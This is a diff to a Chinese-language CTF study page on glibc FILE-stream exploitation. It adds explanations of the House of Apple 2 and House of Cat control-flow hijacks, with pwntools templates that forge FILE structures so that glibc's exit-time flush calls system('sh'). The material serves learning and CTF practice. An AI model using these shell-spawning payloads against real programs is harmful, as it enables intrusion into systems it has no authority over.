@@ -678,7 +678,7 @@ p.interactive()
 p.recvall(timeout=1)
 ```
 
-### 控制流劫持
+### 控制流劫持（House of Apple 2）
 
 前面提到，libc 在结束进程前，会遍历 `_IO_list_all` 链表，每个 FILE 的缓冲区是否还有内容：如果检查 `fp->_IO_write_ptr > fp->_IO_write_base` 或者 `_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)` 成立，就说明还有数据没有通过 write syscall 写出去，这时候就会调用 overflow hook 函数来做这件事情。overflow hook 本身保存在 vtable 中，而 vtable 受到了保护，在 `IO_validate_vtable` 函数中检查它是否合法，即是否为 glibc 自带的 vtable，此时如果用自己构造的 vtable，就会出现 `Fatal error: glibc detected an invalid stdio handle` 错误。
 
@@ -912,11 +912,166 @@ int main() {
 
 注：从 glibc 2.38 开始，由于 [Always do locking when accessing streams (bug 15142, bug 14697)](https://github.com/bminor/glibc/commit/af130d27099651e0d27b2cf2cfb44dafd6fe8a26) 的改动，`_IO_cleanup` 会去获取 FILE 结构的锁，此时它的 `_lock` 字段需要指向一个合法的 `_IO_lock_t` 结构体，此时可以复用 stdin/stdout/stderr 已有的锁：`_IO_stdfile_{0,1,2}_lock`。
 
+小结：
+
+House of Apple 2 的原理：
+
+1. `_IO_cleanup` 调用 `_IO_flush_all_lockp`
+2. `_IO_flush_all_lockp` 调用 `_IO_OVERFLOW`
+3. 通过设置 `fake_file->vtable` 为 `_IO_wfile_jumps`，使得 `_IO_OVERFLOW` 实际上调用的是 `_IO_wfile_overflow`
+4. `_IO_wfile_overflow` 调用 `_IO_WDOALLOCATE`
+5. 通过设置 `fake_file->file._wide_data->_wide_vtable->__doallocate` 为 `system`，使得 `__IO_WDOALLOCATE` 实际上调用的是 `system`
+
+pwntools 模板：
+
+```python
+# version 1
+payload = flat(
+    {
+        # fake_file->file._flags
+        # requirements:
+        # (_flags & 0x0002) == 0
+        # (_flags & 0x0008) == 0
+        # (_flags & 0x0800) == 0
+        # with spaces:
+        # " sh\x00"
+        # 0x20, 0x73, 0x68, 0x00
+        # 0x00: b" sh\x00",
+        # without spaces:
+        # 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00
+        0x00: b"aa;sh\x00",
+        # fake_file->file._wide_data->_IO_write_base
+        0x18: p64(0),
+        # fake_file->file._IO_write_base
+        0x20: p64(0),
+        # fake_file->file._IO_write_ptr
+        0x28: p64(1),
+        # fake_file->file._wide_data->_IO_buf_base
+        0x30: p64(0),
+        # fake_file->file._wide_data->_wide_vtable->__doallocate
+        0x68: libc.symbols["system"],
+        # fake_file->file._lock
+        0x88: libc_unstrip.symbols["_IO_stdfile_0_lock"],
+        # fake_file->file._wide_data
+        0xA0: fake_file,
+        # fake_file->file._mode
+        0xC0: p64(0),
+        # fake_file->vtable
+        0xD8: libc.symbols["_IO_wfile_jumps"],
+        # fake_file->file._wide_data->_wide_vtable
+        0xE0: fake_file,
+    }
+)
+
+# version 2
+# point fake_file->vtable to fake_file - 0x10 to avoid overflow
+payload = flat(
+    {
+        # fake_file->file._flags
+        # requirements:
+        # (_flags & 0x0002) == 0
+        # (_flags & 0x0008) == 0
+        # (_flags & 0x0800) == 0
+        # basic approach with spaces:
+        # " sh\x00"
+        # 0x20, 0x73, 0x68, 0x00
+        # 0x00: b" sh\x00",
+        # without spaces:
+        # 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00
+        0x00: b"aa;sh\x00",
+        # fake_file->file._wide_data->_IO_write_base
+        0x08: p64(0),
+        # fake_file->file._IO_write_base
+        # fake_file->file._wide_data->_IO_buf_base
+        0x20: p64(0),
+        # fake_file->file._IO_write_ptr
+        0x28: p64(1),
+        # fake_file->file._wide_data->_wide_vtable->__doallocate
+        0x68: libc.symbols["system"],
+        # fake_file->file._lock
+        0x88: libc_unstrip.symbols["_IO_stdfile_0_lock"],
+        # fake_file->file._wide_data
+        0xA0: fake_file - 0x10,
+        # fake_file->file._mode
+        0xC0: p64(0),
+        # fake_file->file._wide_data->_wide_vtable
+        0xD0: fake_file,
+        # fake_file->vtable
+        0xD8: libc.symbols["_IO_wfile_jumps"],
+    }
+)
+```
+
+
+### 控制流劫持（House of Cat）
+
+House of Cat 是另一种控制流劫持的方法，它的原理是：
+
+1. `_IO_cleanup` 调用 `_IO_flush_all_lockp`
+2. `_IO_flush_all_lockp` 调用 `_IO_OVERFLOW`
+3. 通过设置 `fake_file->vtable` 为 `_IO_wfile_jumps + 0x30`，使得 `_IO_OVERFLOW` 实际上调用的是 `_IO_wfile_seekoff`
+4. `_IO_wfile_seekoff` 调用 `_IO_switch_to_wget_mode`
+5. `_IO_switch_to_wget_mode` 调用 `_IO_WOVERFLOW`
+6. 通过设置 `fake_file->file._wide_data->_wide_vtable->__overflow` 为 `system`，使得 `__IO_WOVERFLOW` 实际上调用的是 `system`
+
+House of cat 原版：
+
+- offset 0x00: `fake_file->file._flags = "sh";`
+- offset 0x48: `fake_file->file._wide_data->_IO_write_base = 0;`
+- offset 0x50: `fake_file->file._wide_data->_IO_write_ptr = 1;`
+- offset 0x58: `fake_file->file._wide_data->_wide_vtable->__overflow = system;`
+- offset 0x88: `fake_file->file._lock = _IO_stdfile_0_lock;`
+- offset 0xa0: `fake_file->file._wide_data = fake_file + 0x30;`
+- offset 0xc0: `fake_file->file._mode = 1;`
+- offset 0xd8: `fake_file->vtable = _IO_wfile_jumps + 0x30;`
+- offset 0x110: `fake_file->file._wide_data->_wide_vtable = fake_file + 0x40;`
+
+避免溢出的版本，把 _wide_data 挪到 fake_file - 0x10：
+
+- offset 0x00: `fake_file->file._flags = "sh";`
+- offset 0x08: `fake_file->file._wide_data->_IO_write_base = 0;`
+- offset 0x10: `fake_file->file._wide_data->_IO_write_ptr = 1;`
+- offset 0x58: `fake_file->file._wide_data->_wide_vtable->__overflow = system;`
+- offset 0x88: `fake_file->file._lock = _IO_stdfile_0_lock;`
+- offset 0xa0: `fake_file->file._wide_data = fake_file - 0x10;`
+- offset 0xc0: `fake_file->file._mode = 1;`
+- offset 0xd0: `fake_file->file._wide_data->_wide_vtable = fake_file + 0x40;`
+- offset 0xd8: `fake_file->vtable = _IO_wfile_jumps + 0x30;`
+
+Pwntools 模板：
+
+```python
+payload = flat(
+    {
+        # fake_file->file._flags
+        0x00: b"sh\x00",
+        # fake_file->file._wide_data->_IO_write_base
+        0x08: p64(0),
+        # fake_file->file._wide_data->_IO_write_ptr
+        0x10: p64(1),
+        # fake_file->file._wide_data->_wide_vtable->__overflow
+        0x58: p64(libc.symbols["system"]),
+        # fake_file->file._lock
+        0x88: p64(libc_unstrip.symbols["_IO_stdfile_0_lock"]),
+        # fake_file->file._wide_data
+        0xA0: p64(fake_file - 0x10),
+        # fake_file->file._mode
+        0xC0: p64(1),
+        # fake_file->file._wide_data->_wide_vtable
+        0xD0: p64(fake_file + 0x40),
+        # fake_file->vtable
+        0xD8: p64(libc.symbols["_IO_wfile_jumps"] + 0x30),
+    }
+)
+```
+
 ## 参考
 
+- [[原创]House of cat 新型 glibc 中 IO 利用手法解析 && 第六届强网杯 House of cat 详解](https://bbs.kanxue.com/thread-273895.htm)
+- [house of cat](https://www.cnblogs.com/Sta8r9/p/17586219.html)
 - [第七届“湖湘杯”House _OF _Emma | 设计思路与解析](https://www.anquanke.com/post/id/260614)
 - [Unexpected heap primitive and unintended solve - codegate quals 2025 writeup](https://rosayxy.github.io/codegate-quals-2025-writeup/)
-- [[原创] House of apple 一种新的 glibc 中 IO 攻击方法 (2)](https://bbs.kanxue.com/thread-273832.htm)
+- [[原创] House of apple 一种新的 glibc 中 IO 攻击方法 (2)](https://bbs.kanxue.com/thread-273832.htm) [同名博客](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)
 - [Advanced Heap Exploitation: File Stream Oriented Programming](https://dangokyo.me/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/)
 - [STACK the Flags CTF 2022](https://chovid99.github.io/posts/stack-the-flags-ctf-2022/)
 - [glibc 2.24 下 IO_FILE 的利用](https://ctf-wiki.org/pwn/linux/user-mode/io-file/exploit-in-libc2.24/)
